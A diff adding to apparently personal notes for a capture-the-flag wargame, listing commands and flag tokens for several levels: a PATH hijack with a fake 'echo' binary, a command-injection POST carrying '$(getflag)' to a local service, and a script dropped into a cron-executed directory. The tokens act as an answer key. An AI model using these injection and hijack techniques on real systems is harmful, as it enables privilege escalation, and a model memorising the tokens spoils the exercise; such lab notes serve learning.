@@ -44,6 +44,33 @@ token = kooda2puivaav1idi4f57q8iq
 
 scp -P 4242 level02@10.12.200.63:level03 .
 
+cd /var/crash
+
+echo "getflag" > echo
+
+chmod +x echo
+
+cd ~
+
+./level03
+
+token = qi0maab88jeaj46qoumi7maus 
+
+################  4  ################
+
+curl -X POST http://localhost:4747 --data 'x=$(getflag)'
+
+token = ne2searoevaevoem4ov4ar8ap
+
+################  5  ################
+
+echo "getflag > /var/crash/log" > /opt/openarenaserver/get
+
+token = viuaaale9huek52boumoomioc
+
+################  5  ################
+
+
 ################  NOTES  ################
 
 in /var/spool/mail il y a : */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
